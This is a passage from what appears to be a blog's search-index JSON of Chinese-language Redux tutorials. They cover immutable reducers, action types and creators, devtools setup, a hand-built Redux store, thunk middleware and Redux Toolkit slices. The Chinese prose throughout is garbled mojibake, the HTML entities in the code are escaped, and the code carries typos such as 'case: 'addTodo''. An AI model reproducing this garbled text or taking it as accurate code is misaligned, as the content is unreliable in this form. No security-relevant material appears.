=&gt; ...);store.subscribe(() =&gt; ...); å°±é€™æ¨£è€Œå·²ã€‚ æœ€å¾Œæ˜¯åšå€‹è£œå……ï¼Œç•¶æˆ‘å€‘åœ¨ Reducer è£¡é¢æ›´æ–° state æ™‚ï¼Œä¸€å®šè¦ç”¨ Immutable çš„æ–¹å¼ä¾†æ”¹è®Šï¼Œé€™é‚Šå…ˆç¤ºç¯„ä¸€å€‹éŒ¯èª¤çš„ç¯„ä¾‹ï¼š 1234567891011121314151617181920const initState = { // ç¾åœ¨å¤šåŠ ä¸€å€‹ email email: '12345@gmail.com', todos: []}function reducer(state, action) { switch (action.type) { case: 'addTodo' // å¿½ç•¥äº† email çš„éƒ¨åˆ† return { todos: [ ...state.todos, {name: action.payload.name} ] } default: return state }} é€™æ¨£å­æ›´æ–°å¾Œçš„ state å°±æœƒè®Šæˆï¼š 123{ todos: [{ name: 'xxx'}]} ç‚ºä»€éº¼ï¼Ÿæˆ‘èªªéä¸€å®šè¦ç”¨ Immutable çš„æ–¹å¼ä¾†æ”¹è®Š stateï¼Œè€Œå‰›å‰›åœ¨ reducer è£¡é¢å›å‚³çš„åªæœ‰ todosï¼Œæ‰€ä»¥ email å°±æ¶ˆå¤±äº†ã€‚ æ­£ç¢ºçš„åšæ³•æ‡‰è©²æ˜¯é€™æ¨£å­ï¼š 123456789101112131415161718192021const initState = { email: '12345@gmail.com', todos: []}function reducer(state, action) { switch (action.type) { case: 'addTodo' return { // å…ˆè¤‡è£½åŸæœ¬çš„ state ...state, // å†å»æ”¹æˆ‘æƒ³è¦æ”¹çš„ state todos: [ ...state.todos, {name: action.payload.name} ] } default: return state }} é€™å°±è·Ÿåœ¨ç”¨ useState çš„æ¦‚å¿µæ˜¯ä¸€æ¨£çš„ï¼Œä¸è¦å¿˜è¨˜å›‰ï¼ ä¾†åšé»å„ªåŒ–ï¼ŒåŠ ä¸Š action type èˆ‡ action creatorå‰é¢é›–ç„¶å·²ç¶“ä»‹ç´¹é Redux çš„åŸºæœ¬ç”¨æ³•ï¼Œä¸éæ‡‰è©²èƒ½æ³¨æ„åˆ°å¹¾å€‹å°å•é¡Œï¼š action æ˜¯ç”¨ã€Œç´”å­—ä¸²ã€ä¾†å¯«çš„ï¼Œé‚£æ‰“éŒ¯å­—æ€éº¼è¾¦ï¼Ÿ æ¯æ¬¡ dispatch éƒ½è¦å‚³ä¸€åŒ… Object æ˜¯ä¸æ˜¯æœ‰é»å¤ª hard code äº†ï¼Ÿ Action Typeé¦–å…ˆæ˜¯ç¬¬ä¸€å€‹å•é¡Œï¼Œé€™å…¶å¯¦è »å›°æ“¾çš„ï¼Œå› ç‚ºå‡è¨­æˆ‘å“ªå¤©æ‰“éŒ¯å­—çš„è©±ï¼š 1234567store.dispatch({ // å¤šä¸€å€‹ s type: 'addTodos' payload: { name: 'PeaNu' }}) é€™æ¨£æ˜¯ä¸æœƒå‡ºè·³å‡ºä»»ä½•éŒ¯èª¤çš„ï¼Œå› ç‚ºå° reducer è€Œè¨€ addTodos åªæ˜¯ä¸€å€‹ä¸å­˜åœ¨çš„ caseï¼Œæ‰€ä»¥åªæœƒè·³åˆ° default å€å¡Šè€Œå·²ã€‚ä½†é€™æ¨£éº»ç…©å¯å°±å¤§äº†ï¼Œå› ç‚ºä½ å¯èƒ½æ ¹æœ¬ä¸çŸ¥é“æ˜¯è‡ªå·±æ‰“éŒ¯å­—çš„é—œä¿‚ã€‚ æ‰€ä»¥æ›´å¥½çš„åšæ³•æ˜¯æ”¹ç”¨ã€ŒAction Typeã€ï¼Œå…¶å¯¦å°±åªæ˜¯å»ºç«‹ä¸€å€‹ constant å•¦ï¼š 1234const actionTypes = { ADD_TODO: 'addTodo', DELETE_TODO: 'deleteTodo'} æ¥è‘—å°±å¯ä»¥å»æŠŠåŸæœ¬çš„ action ä¿®æ”¹æˆé€™æ¨£ï¼š 123456789101112131415161718192021222324252627282930313233// 1. reducer è£¡çš„ action function todosReducer (state = initState, action) { switch (action.type) { // æ–°å¢ todo case actionTypes.ADD_TODO: return { ...state, todos: [ ...state.todos, { id: id++, name: action.payload.name, } ] } // åˆªé™¤ todo case actionTypes.DELETE_TODO: return { ...state, todos: state.todos.filter(todo =&gt; todo.id !== action.payload.id) } default: return state }}// 2. dispatch çš„ actionï¼Œå…¶ä»–ä»¥æ­¤é¡æ¨store.dispatch({ type: actionTypes.ADD_TODO, payload: { name: 'todo1' }}) ç¾åœ¨æŠŠ action éƒ½æ”¹æˆè®Šæ•¸ä»¥å¾Œï¼Œå¦‚æœæˆ‘åˆæ‰“éŒ¯å­—ï¼Œç³»çµ±å°±æœƒç›´æ¥å™´ Error è·Ÿæˆ‘èªªAction may not have a undefined type property ä¹‹é¡çš„ï¼Œä¸æœƒå†æœ‰åŸæœ¬é‚£ç¨®æ‰¾ä¸å‡º bug çš„éº»ç…©ã€‚ Action creatoræ¥è‘—æ˜¯ç¬¬äºŒå€‹å•é¡Œï¼Œå¦‚æœæ¯æ¬¡ dispatch éƒ½è¦é€™æ¨£å¯«çš„è©±çœŸçš„è »éº»ç…©çš„ï¼š 123456store.dispatch({ type: actionTypes.ADD_TODO, payload: { name: 'todo1' }}) å¦‚æœå¯ä»¥å¯«æˆé€™æ¨£çš„è©±ä¸–ç•Œæ˜¯ä¸æ˜¯æœƒæ›´å¥½ï¼Ÿ 1store.dispatch(addTodo('todo1')); æœ‰è¾¦æ³•åšåˆ°å—ï¼Ÿå…¶å¯¦å‰›å‰›æœ‰æš—ç¤ºéï¼Œä½ åªè¦æƒ³æƒ³ action çš„æœ¬è³ªï¼Œå°±æœƒç™¼ç¾è¦åšåˆ°é€™é»ä¸¦ä¸å›°é›£ã€‚ å‰›å‰›èªªéï¼Œaction çš„æœ¬è³ªåªæ˜¯ä¸€å€‹ Objectï¼Œæ‰€ä»¥æˆ‘å€‘åªè¦å¯«ä¸€å€‹å¯ä»¥å›å‚³å°æ‡‰ Object çš„ function ä¸å°±å¥½äº†å—ï¼Ÿ 123456789function addTodo(name) { // é€™é‚Šå›å‚³çš„æ±è¥¿å°±æ˜¯ actionï¼ˆObjectï¼‰ return { type: ActionTypes.ADD_TODO, payload: { name } }} é€™ç¨®åšæ³•å°±å«åšã€ŒAction creatorã€ï¼Œè¬›ç™½è©±ä¸€é»å°±æ˜¯æŠŠ action è¦å‚³çš„å…§å®¹æ”¹ç”¨ function ä¾†å¯«è€Œå·²ã€‚ ç¸½ä¹‹å‘¢ï¼Œåªè¦æ”¹ç”¨é€™ç¨®æ–¹å¼å„ªåŒ–å¾Œï¼Œä½ çš„ code å°±æœƒä¹¾æ·¨è¨±å¤šï¼Œä¹Ÿæ¯”è¼ƒå¥½ç¶­è­·ã€‚ æœ€å¾Œæ‡‰è­‰ä¸€ä¸‹æˆ‘æœ€é–‹å§‹èªªçš„ï¼ŒRedux ä¸¦æ²’æœ‰ä¸€å®šè¦è·Ÿ React ç¶åœ¨ä¸€èµ·ç”¨ï¼Œæ‰€ä»¥é€™é‚Šé™„ä¸Šä¸€å€‹ç”¨ Vanilla JS + Redux å¯«çš„ todo ç¯„ä¾‹ï¼Œå¦‚æœæœ‰ä»»ä½•ç–‘æƒ‘å°±å»çœ‹çœ‹å§ã€‚","link":"/2022/04/23/redux-basic/"},{"title":"ä½¿ç”¨ redux-devtool çš„å°æé†’","text":"å¯«ä¸‹ä¾†æ‰ä¸æœƒå¿˜ã€‚ ç°¡è¿°ç°¡å–®ä¾†èªªå°±æ˜¯ä¸€å€‹è®“ä½ æª¢æŸ¥ redux é‹ä½œçš„å·¥å…·ï¼Œåªæ˜¯æƒ³æé†’ä¸‹é¢é€™ä»¶äº‹ã€‚ è«‹è¨˜å¾—ä¸€å®šè¦åœ¨ store.js è£¡åŠ ä¸Šé€™æ®µæ‰èƒ½æ­£å¸¸é‹ä½œï¼š 1234export default createStore( rootReducer, window.__REDUX_DEVTOOLS_EXTENSION__ &amp;&amp; window.__REDUX_DEVTOOLS_EXTENSION__());","link":"/2022/04/24/redux-devtool/"},{"title":"ç”¨å¯¦ä½œçš„æ–¹å¼ä¾†é‡æ–°å­¸ç¿’ Redux","text":"å†æ¬¡çªç ´çœ¼ç•Œã€‚ ç°¡è¿°åœ¨æˆ‘å€‘è¦è·¨çµ„ä»¶æºé€šæ™‚ï¼Œå¾ˆå¸¸æœƒæ„ˆåˆ°ã€Œprops drillingã€çš„å•é¡Œï¼Œæ‰€ä»¥ç‚ºäº†è§£æ±ºé€™å€‹å•é¡Œå°±æœ‰äº† Redux æˆ– Context çš„å‡ºç¾ã€‚ æœ€è¿‘æ­£å¥½çœ‹äº†ä¸€éƒ¨æ•™å­¸è¬›çš„å¾ˆä¸éŒ¯ï¼Œè£¡é¢æ˜¯å¾å¯¦ä½œ Redux åº•å±¤çš„è§€å¿µä¾†å¸¶ä½ èªè­˜ Reduxã€‚æˆ‘è¦ºå¾—é€™ç¨®å¾ªåºæ¼¸é€²çš„æ–¹å¼é‚„è »ä¸éŒ¯çš„ï¼Œæ‰€ä»¥æ‰æœƒå¯«ä¸‹é€™ç¯‡ä¾†è¨˜éŒ„ã€‚ å¦‚æœä½ å·²ç¶“å­¸é Redux çš„è©±ï¼Œé€™ç¯‡æ‡‰è©²å°±ä¸é›£æ‡‚ï¼Œæ²’å­¸éçš„è©±å¯èƒ½æœƒéœ€è¦å¤šèŠ±ä¸€é»æ™‚é–“ä¾†ç†è§£ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œè®“æˆ‘å€‘é¦¬ä¸Šä¾†è©¦è©¦çœ‹å§ã€‚ å¾ globalState é–‹å§‹é¦–å…ˆå…ˆå»ºç«‹ä¸€å€‹ globalState.jsï¼Œå®ƒçš„ç”¨é€”å°±æ˜¯æ‹¿ä¾†æ”¾ç½® stateï¼Œæ‰€ä»¥ Component åªè¦é€éé€™å€‹æª”æ¡ˆä¾†æ‹¿å°±å¥½äº†ã€‚ æœ€åŸºæœ¬çš„å…§å®¹å¦‚ä¸‹ï¼š 1234567export let globalState = { counter: 0,};export const setGlobalState = (newState) =&gt; { globalState = newState;}; æ¥è‘—åªè¦åœ¨å°æ‡‰çš„ Component å¼•å…¥ globalState å’Œ setGlobalState å°±å¯ä»¥å°é€™è£¡é¢çš„æ±è¥¿åšå­˜å–æˆ–æ“ä½œã€‚ é€™é‚Šå…ˆèªªæ˜ä¸€ä¸‹çµ„ä»¶çµæ§‹ï¼Œå¤§æ¦‚æ˜¯é•·é€™æ¨£ï¼š App Wrapper Counter Button Counter è² è²¬é¡¯ç¤ºæ•¸å­—ï¼ŒButton å‰‡æ˜¯è² è²¬ç”¨ä¾†æ”¹è®Š state çš„æŒ‰éˆ•ã€‚ æ¥è‘—å°±é€é globalState ä¾†ä¸²æ¥åˆ° Componentï¼Œæ‰€ä»¥é€™æ™‚å€™å…©è€…çš„å…§å®¹å¤§æ¦‚æœƒå¦‚ä¸‹ï¼š 12345678910111213// Counterimport React, { Component } from \"react\";import { globalState } from \"./globalState\";export default class Counter extends Component { state = { counter: globalState.counter, } render() { return &lt;h2&gt;Counter: {this.state.counter}&lt;/h2&gt; }} 123456789101112131415// Buttonimport React, { Component } from \"react\";import { setGlobalState } from \"./globalState\";export default class Button extends Component { handleClick = () =&gt; { setGlobalState({ counter: Math.random() }) } render() { return &lt;button onClick={this.handleClick}&gt;add&lt;/button&gt; }} åšåˆ°é€™é‚Šä»¥å¾Œï¼Œç›®å‰çš„æƒ…æ³æ‡‰è©²æ˜¯é€™æ¨£ï¼š ç•«é¢æœƒé¡¯ç¤º Counter: 0 æŒ‰ä¸‹æŒ‰éˆ•å¾Œæœƒè§¸ç™¼ setGlobalState æ›´æ–° globalState åªä¸éæœ‰ä¸€å€‹å•é¡Œï¼Œå°±æ˜¯ç•«é¢ä¸æœƒæ›´æ–°ã€‚ åŸå› å¾ˆç°¡å–®ï¼Œé›–ç„¶æˆ‘å€‘ç¢ºå¯¦æ˜¯æ”¹è®Šäº† globalState è£¡çš„å€¼ï¼Œå¯æ˜¯åˆæ²’æœ‰æ”¹è®Š Component è£¡é¢çš„ stateï¼Œæ‰€ä»¥ç•¶ç„¶ä¸æœƒè§¸ç™¼ re-renderã€‚ é‚£è©²æ€éº¼è¾¦ï¼Ÿæˆ‘å€‘å¯ä»¥åœ¨ globalState åŠ ä¸Šå¹¾å€‹æ±è¥¿ï¼š subscribe notifyAll é—œæ–¼é€™å…©å€‹æ±è¥¿çš„ç”¨é€”ï¼Œæˆ‘ç›´æ¥å¯«åœ¨è¨»è§£è£¡ï¼š 123456789101112131415161718192021222324// æ‰€æœ‰è¨‚é–± globalState çš„äººå‚³é€²ä¾†çš„ functionconst callbacks = [];export let globalState = { counter: 0,};// æŠŠæ‰€æœ‰äººçš„ callback åŸ·è¡Œä¸€éï¼Œä¸¦æŠŠæ›´æ–°å¾Œçš„ state å‚³é€²å»const notifyAll = () =&gt; { for (let i = 0; i &lt; callbacks.length; i++) { callbacks[i](globalState); }};// è¦è¨‚é–±çš„äººå°±å‚³ä¸€å€‹ callback é€²ä¾†export const subscribe = (callback) =&gt; { callbacks.push(callback);};export const setGlobalState = (newState) =&gt; { globalState = newState; // æ›´æ–°å¾Œé€šçŸ¥æ‰€æœ‰è¨‚é–±è€… notifyAll();}; ç°¡å–®ä¾†èªªï¼ŒComponent å¯ä»¥é€é subscribe ä¾†è¨‚é–±ï¼Œè¨‚é–±çš„æ„æ€å°±æ˜¯ã€Œç•¶ globalState æ”¹è®Šçš„æ™‚å€™ï¼Œé€šçŸ¥æˆ‘ä¸€è²ã€ã€‚é‚£è¦æ€éº¼é€šçŸ¥ï¼ŸJS å¯«ä¹…çš„è©±æ‡‰è©²éƒ½ä¸é™Œç”Ÿï¼Œå°±æ˜¯ç”¨ callback å˜›ï¼Œæ‰€ä»¥ subscribe é€™å€‹ function è¦åšçš„äº‹å°±æ˜¯ï¼š æ¥æ”¶ä¸€å€‹ callback æŠŠé€™å€‹ callback å„²å­˜èµ·ä¾†ï¼ˆæ”¾åˆ° callbacks é€™å€‹é™£åˆ—ï¼‰ è€Œ notifyAll è¦åšçš„äº‹æƒ…åªæ˜¯æŠŠæ‰€æœ‰ callback åŸ·è¡Œä¸€éè€Œå·²ï¼Œä¸¦ä¸”æŠŠæŠŠæœ€æ–°çš„ globalState ç•¶ä½œåƒæ•¸å‚³é€²å»ï¼Œæ¥è‘— Component å°±å¯ä»¥é€é callback æ‹¿åˆ°ã€‚ æ‰€ä»¥å‘¢ï¼Œé€™é‚Šåªè¦ä¿®æ”¹ä¸€ä¸‹ Counter å°±å¥½ï¼š 1234567891011121314151617181920212223import React, { Component } from \"react\";import { globalState, subscribe } from \"./globalState\";export default class Counter extends Component { state = { counter: globalState.counter, } // mount å¾Œè¨‚é–± componentDidMount() { subscribe(this.updateCounter); } // æ”¶åˆ°é€šçŸ¥æ™‚ï¼Œè¦åŸ·è¡Œçš„ callback updateCounter = newState =&gt; { this.setState(newState); }; render() { return &lt;h2&gt;Counter: {this.state.counter}&lt;/h2&gt; }} åšåˆ°ç›®å‰ç‚ºæ­¢ï¼Œç•«é¢æ‡‰è©²è¦å¯ä»¥éš¨è‘— globalState åšæ›´æ–°ï¼Œæœ‰ä»»ä½•å•é¡Œçš„è©±å¯ä»¥åˆ°æˆ‘å¯«çš„ç¯„ä¾‹åƒè€ƒã€‚ èªè­˜ HOCï¼ˆHigher Order Componentï¼‰å‰›å‰›çš„ä¾‹å­å·²ç¶“æŠŠ state å’Œ Component çµ¦ä¸²èµ·ä¾†äº†ï¼Œä¸éæœ‰å€‹å•é¡Œæ˜¯ã€Œæ¯ä¸€å€‹ Component å¦‚æœéƒ½è¦è‡ªå·±åŠ ä¸Š state = {...} å’Œ subscribe çš„è©±ã€ï¼Œå…¶å¯¦é‚„è »é»éº»ç…©çš„ï¼Œæ‰€ä»¥é€™é‚Šå°±è¦ç”¨ HOC çš„æ¦‚å¿µä¾†æ”¹å¯«å‰›å‰›çš„ç¯„ä¾‹ã€‚ é™„è¨»ï¼šHOC å…¶å¯¦å°±æ˜¯ç”¨ Component åŒ…ä½å¾Œå†æŠŠ props å‚³ä¸‹å»è€Œå·²ï¼Œä¸ç”¨æƒ³å¾—å¤ªè¤‡é›œã€‚ å…ˆä¾†å¯«ä¸€å€‹ utilsï¼Œç”¨ä¾†åŒ…è£ç”¨çš„ï¼š 123456789101112131415161718192021222324// HocCreator.jsimport { globalState, subscribe } from \"./globalState\"import React, { Component } from \"react\"// æ¥æ”¶ä¸€å€‹ Componentexport function connect (Comp) { // smart component class Hoc extends Component { state = { counter: globalState.counter } componentDidMount () { subscribe(this.updateState) } updateState = newState =&gt; { this.setState(newState) } // æŠŠ state ç•¶ä½œ props å‚³ä¸‹å» render () { return &lt;Comp {...this.state} /&gt; } } return Hoc} æ¥è‘—åªè¦æŠŠæœƒç”¨åˆ° globalState çš„ Component åŒ…è£èµ·ä¾†å°±å¥½äº†ï¼š 1234567891011import React, { Component } from \"react\";import { connect } from \"./HocCreator\"class Counter extends Component { // ç¾åœ¨åªè¦å¾ props æŠŠ state æ‹¿å‡ºä¾†ç”¨å°±è¡Œäº† render() { return &lt;h2&gt;Counter: {this.props.counter}&lt;/h2&gt; }}export default connect(Counter); é€éæŒ‡ä»¤ä¾†ä¿®æ”¹ stateç¾åœ¨åˆæœ‰ä¸€å€‹æ–°çš„å•é¡Œï¼Œå°±æ˜¯ã€Œå¦‚æœè¢«åˆ¥äººæ”¹åˆ° state æ€éº¼è¾¦ã€ï¼Œåƒé€™æ¨£ï¼š 1234567891011121314151617181920import React, { Component } from \"react\";import { setGlobalState } from \"./globalState\";// å‡è¨­åŸæœ¬çš„ state é•·é€™æ¨£ï¼š// globalState: {// counter: 0,// text: 'abc'// }class OtherGuysComponent extends Component { render() { return &lt;button onClick={() { setGlobalState({ text: '12345' }) }}&gt;change global state&lt;/button&gt; }}export default connect(OtherGuysComponent); é€™æ¨£ counter å°±æœƒåœ¨ setGlobalState çš„æ™‚å€™è¢«è¦†å¯«æ‰ï¼Œç„¶å¾Œå°±æ¶ˆå¤±äº†ã€‚ æ‰€ä»¥è¦è§£æ±ºé€™å€‹å•é¡Œï¼Œå¯ä»¥æ”¹æˆã€Œé€éæŒ‡ä»¤ã€çš„æ–¹å¼ä¾†æ›´æ–° stateï¼ˆå¦‚æœä½ å­¸é redux çš„è©±ï¼Œå…¶å¯¦é€™å°±æ˜¯ dispatch çš„æ¦‚å¿µï¼‰ å¯¦ä½œæ–¹æ³•ä¹Ÿä¸é›£ï¼Œæˆ‘å€‘é æœŸ Component æœƒé€™æ¨£å­ç”¨ï¼š 1234567891011121314151617import React, { Component } from \"react\";import { setGlobalState } from \"./globalState\";class OtherGuysComponent extends Component { render() { return &lt;button onClick={() { // å‚³å…¥ä¸€å€‹ actionï¼Œè£¡é¢åŒ…å« type è·Ÿ payload çš„è³‡è¨Š dispatch({ type: 'UPDATE_TEXT', payload: '12345' }) }}&gt;change global state&lt;/button&gt; }}export default connect(OtherGuysComponent); æ¥è‘—å›åˆ° globalState çš„éƒ¨åˆ†ä¾†å¯¦ä½œ dispatch é€™å€‹ functionï¼š 1234567891011// globalState.jsexport const dispatch = (action) =&gt; { // æ ¹æ“š action type ä¾†æ›´æ–°éƒ¨åˆ†çš„ state if (action.type === 'UPDATE_TEXT') { globalState.text = action.payload } else if (action.type === 'ADD_COUNTER') { globalState.counter = globalState.counter + action.payload } // æœ€å¾Œè¨˜å¾—ä¸€æ¨£è¦ç™¼é€šçŸ¥ notifyAll();}; æ¥ä¸‹ä¾†æ˜¯ actionType å’Œ action creator çš„å„ªåŒ–ï¼Œå°±ä¸ç‰¹åˆ¥å¯«å‡ºä¾†äº†ï¼Œå¿˜è¨˜çš„è©±å¯ä»¥çœ‹ é€™ç¯‡ ä¾†è¤‡ç¿’ã€‚ æœ€å¾Œä¸€å¡Šæ‹¼åœ– reducerå…¶å¯¦å°±æ˜¯æŠŠå‰›å‰›çš„æ±è¥¿åšæœ€å¾Œå„ªåŒ–ï¼Œå…ˆä¾†è¤‡ç¿’ä¸€ä¸‹å‰›å‰›çš„é€²åº¦ï¼š 123456789101112131415export let globalState = { text: '12345', counter: 0,};export const dispatch = (action) =&gt; { // æ ¹æ“š action type ä¾†æ›´æ–°éƒ¨åˆ† state if (action.type === 'UPDATE_TEXT') { globalState.text = action.payload } else if (action.type === 'ADD_COUNTER') { globalState.counter = globalState.counter + action.payload } // è¨˜å¾—ä¸€æ¨£è¦ç™¼é€šçŸ¥ notifyAll()}; æˆ‘å€‘å¸Œæœ›å„ªåŒ–æˆé€™æ¨£å­ï¼š 123456export const dispatch = (action) =&gt; { // åŠ ä¸Š reducer globalState = reducer(globalState, action); // ç™¼é€šçŸ¥ notifyAll()} æ‰€ä»¥æ›å¥è©±èªª reducer çš„ä½œç”¨å°±æ˜¯ï¼š 12// æŠŠ state è·Ÿ action ä¸Ÿé€²å»ä»¥å¾Œï¼Œå›å‚³æ–°çš„ statenewState = reducer(currentState, action); æ‰€ä»¥æœ€å¾Œåªè¦æŠŠ reducer å¯¦ä½œå‡ºä¾†å°±å¥½äº†ï¼š 12345678910111213141516function reducer (state, action) { switch (action.type) { case ADD_COUNTER: return { ...state, counter: state.counter + action.payload } case UPDATE_TEXT: return { ...state, text: action.payload } default: return state }} å¥½ï¼Œé—œæ–¼å¯¦ä½œçš„éƒ¨åˆ†åˆ°é€™é‚Šå°±å®Œæˆäº†ï¼åŒæ™‚ä½ ä¹Ÿå­¸æœƒäº† redux çš„å¹¾å€‹æ ¸å¿ƒç†å¿µï¼š store action reducer dispatch ç¶“éå¯¦ä½œä»¥å¾Œï¼Œæœ‰æ›´æ¸…æ¥šæ•´å€‹ä¾†é¾å»è„ˆï¼Œæˆ‘è¦ºå¾—é‚„è »ä¸éŒ¯çš„ã€‚å¦‚æœæƒ³åƒè€ƒæœ€å¾Œçš„æˆæœå¯ä»¥åˆ° é€™é‚Š çœ‹ã€‚","link":"/2022/05/18/redux-implementation/"},{"title":"Redux middleware","text":"åˆæ˜¯ middlewareã€‚ ç°¡è¿°å°±è·Ÿ Express è£¡é¢çš„ middleware å·®ä¸å¤šï¼ŒExpress çš„ middleware æ˜¯æŠŠ request ç¶“éè™•ç†å¾Œå†å›å‚³ responseï¼Œåœ¨ reudx çš„ middleware å‰‡æ˜¯æŠŠ action å…ˆç¶“éä¸€æ®µè™•ç†å¾Œå†ä¸Ÿçµ¦ reducer ä¾†è™•ç†ã€‚ ç°¡å–®ä¾†èªªï¼ŒåŸæœ¬æˆ‘å€‘çš„ action åªèƒ½æ˜¯ä¸€å€‹ Objectï¼š 12345678910const ADD_TODO = 'addTodo'function addTodo(name) { return { type: ADD_TODO, payload: { name } }} ä½†åŠ ä¸Š middleware ä»¥å¾Œï¼Œaction è®Šæˆå¯ä»¥æ˜¯ä¸€å€‹ functionï¼š 1234567function addTodoAsync (name) { return function (dispatch) { setTimeout(() =&gt; { dispatch(addTodo(name)); }, 1000) }} é€™å€‹ function æœƒè¢«å‚³å…¥ä¸€å€‹ dispatchï¼Œä½ åªè¦æŠŠçœŸæ­£è¦ dispatch çš„actionn å¯«åœ¨è£¡é¢å°±è¡Œäº†ã€‚è€Œé€™ä¹Ÿå°±æ˜¯ redux-think é€™å¥— middleware åœ¨åšçš„äº‹æƒ… å¹«ä½ åŸ·è¡Œ function å°±é€™æ¨£ï¼Œæ²’äº†ã€‚ å¦‚æœé‚„æ˜¯ä¸å¤ªæ¸…æ¥šçš„è©±ï¼Œå»ºè­°åƒè€ƒå®˜æ–¹æ–‡ä»¶çš„åœ–ï¼Œéå¸¸ä¸€ç›®äº†ç„¶ã€‚ ç¯„ä¾‹é€™é‚Šæ²¿ç”¨ ç”¨ Redux-toolkit ä¸²æ¥ React å’Œ Redux çš„ç¯„ä¾‹ä¾†åšå€‹ç°¡å–®çš„ç¤ºç¯„ï¼š 12345678910111213141516171819202122232425262728293031323334353637import { createSlice } from \"@reduxjs/toolkit\";const initialState = { todos: []}let id = 0;export const todosSlice = createSlice({ name: 'todos', initialState, reducers: { addTodo: (state, action) =&gt; { state.todos.push({ id: id++, name: action.payload }); }, deleteTodo: (state, action) =&gt; { state.todos = state.todos.filter(todo =&gt; todo.id !== action.payload); } }})// å¤šè¼¸å‡ºä¸€å€‹ actionï¼Œç”¨éåŒæ­¥çš„æ–¹å¼ä¾†æ–°å¢ todoexport const addTodoAsync = name =&gt; dispatch =&gt; { setTimeout(() =&gt; { dispatch(addTodo(name)) }, 1000)}export const { addTodo, deleteTodo } = todosSlice.actions;export const selectTodos = state =&gt; state.todosReducer.todos;export default todosSlice.reducer æ¥è‘—å›åˆ° React Component è£¡é¢å°±èƒ½ç›´æ¥ä½¿ç”¨äº†ï¼š 123456789101112131415161718192021222324252627282930313233343536373839import { selectTodos } from \"./features/todos/todosSlice\";import { deleteTodo, addTodoAsync } from './features/todos/todosSlice';import { useDispatch ,useSelector } from \"react-redux\"; import { useState } from \"react\";function App() { const [value, setValue] = useState(\"\"); const todos = useSelector(selectTodos); const dispatch = useDispatch(); const handleSubmit = e =&gt; { e.preventDefault(); if (!value) return; // å‰›å‰›æ–°å¢çš„ action dispatch(addTodoAsync(value)); setValue(\"\"); } return ( &lt;div className=\"App\"&gt; &lt;h1&gt;Todos&lt;/h1&gt; &lt;form onSubmit={handleSubmit}&gt; &lt;input type=\"text\" value={value} onChange={e =&gt; setValue(e.target.value)} /&gt; &lt;/form&gt; &lt;ul&gt; {todos.map(todo =&gt; ( &lt;li key={todo.id}&gt; {todo.name} &lt;button onClick={() =&gt; dispatch(deleteTodo(todo.id))}&gt;delete&lt;/button&gt; &lt;/li&gt; ))} &lt;/ul&gt; &lt;/div&gt; );}export default App; ç¾åœ¨å°±èƒ½ç”¨éåŒæ­¥çš„æ–¹å¼ä¾†æ–°å¢ Todoï¼Œæƒ³çœ‹æ•ˆæœçš„è©±å¯ä»¥å»æˆ‘å¯«çš„ç¯„ä¾‹ä¾†è©¦ã€‚","link":"/2022/04/25/redux-middleware/"},{"title":"ç”¨ Redux-toolkit ä¸²æ¥ React å’Œ Redux","text":"å¿«é‚„è¦æ›´å¿«ã€‚ ç°¡è¿°ä¸€å€‹ React redux å»¶ä¼¸å‡ºä¾†çš„å·¥å…·ï¼Œç›®çš„åªæ˜¯è¦è§£æ±ºåŸæœ¬ç”¨ React redux å‰ç½®ä½œæ¥­å¤ªéº»ç…©çš„å•é¡Œï¼ˆåƒæ˜¯è¦å»ºç«‹ storeã€reducersã€actionType ç­‰ç­‰ï¼‰ã€‚ å¦‚æœè¦ºå¾—æˆ‘å¯«å¤ªçˆ›çš„è©±ä¹Ÿå¯ä»¥åƒè€ƒé€™ç¯‡ï¼Œæˆ‘è¦ºå¾—å¯«å¾—è »æ¸…æ¥šçš„ã€‚ ç‰¹è‰² å¯ä»¥ç”¨ mutable çš„æ–¹å¼ä¾†æ›´æ–° stateï¼ˆæ­é… immer é€™å€‹å¥—ä»¶é”æˆçš„ï¼‰ æŠŠéœ€è¦çš„æ±è¥¿é›†ä¸­ç®¡ç†ï¼ˆaction typeã€action creatorã€selectorï¼‰ æ–¹ä¾¿èˆ‡å…¶ä»– middle ware ä½¿ç”¨ å‰ç½®ä½œæ¥­1. ç”¨ create react app 1npx create-react-app my-app --template redux 2. ç¾æœ‰çš„ create react app 123npm install @reduxjs/toolkitnpm install react-reduxnpm install redux é€™é‚Šæœƒç”¨ç¬¬äºŒç¨®æ–¹å¼ä¾†ä¸€æ­¥ä¸€æ­¥æ­å»º redux toolkit ç’°å¢ƒï¼Œé€™æ¨£æ¯”è¼ƒèƒ½çŸ¥é“æ¯å€‹ API åœ¨å¹¹å˜›ã€‚ é€™é‚Šä¹Ÿå¾ˆæ¨è–¦å»çœ‹å®˜æ–¹æ–‡ä»¶ï¼Œå…§å®¹æ‡‰è©²å°±è·Ÿæˆ‘ç­‰ä¸€ä¸‹è¦è¬›çš„å·®ä¸å¤šã€‚ è³‡æ–™å¤¾çµæ§‹ src app store.js features todos todosSlice.js index.js app.js 1. å»ºç«‹ store 12345import { configureStore } from \"@reduxjs/toolkit\";export const store = configureStore({ reducer: {},}) 2. è¨­å®š Provider 12345678910111213import React from 'react';import ReactDOM from 'react-dom/client';import './index.css';import App from './App';import { Provider } from 'react-redux';import { store } from './app/store';const root = ReactDOM.createRoot(document.getElementById('root'));root.render( &lt;Provider store={store}&gt; &lt;App /&gt; &lt;/Provider&gt;); é€™æ¨£å­ä»¥å¾Œå°±å¯ä»¥ä½¿ç”¨ redux devtool äº†ï¼Œä¸ç”¨åƒä»¥å‰é‚„è¦åŠ ä¸€ä¸²ã€‚ å»ºç«‹ Sliceï¼ˆæœ€é‡è¦çš„ä¸€é»ï¼‰åœ¨ redux toolkit æœƒç”¨ createSlice ä¾†åŒ…å«æ‰€æœ‰æ±è¥¿ã€‚ç°¡å–®ä¾†èªªï¼Œä¸€å€‹ Slice æœƒåŒ…å«ï¼š reducer action creator action type selector æ‰€ä»¥ä¾ç…§å‰é¢çš„è³‡æ–™å¤¾çµæ§‹ï¼Œæœƒåœ¨ /feature/todos/todosSlice.js å»ºç«‹é€™æ¨£çš„å…§å®¹ï¼š 123456789101112131415161718192021222324252627282930313233import { createSlice } from \"@reduxjs/toolkit\";const initialState = { todos: []}let id = 0;// å¯ä»¥æƒ³æˆæ˜¯ reducerï¼Œä½†çµåˆäº† actionType è·Ÿ actionexport const todosSlice = createSlice({ name: 'todos', initialState, reducers: { addTodo: (state, action) =&gt; { state.todos.push({ id: id++, name: action.payload }); }, deleteTodo: (state, action) =&gt; { state.todos = state.todos.filter(todo =&gt; todo.id !== action.payload); } }})// æŠŠ action å¾ slice å–å‡ºexport const { addTodo, 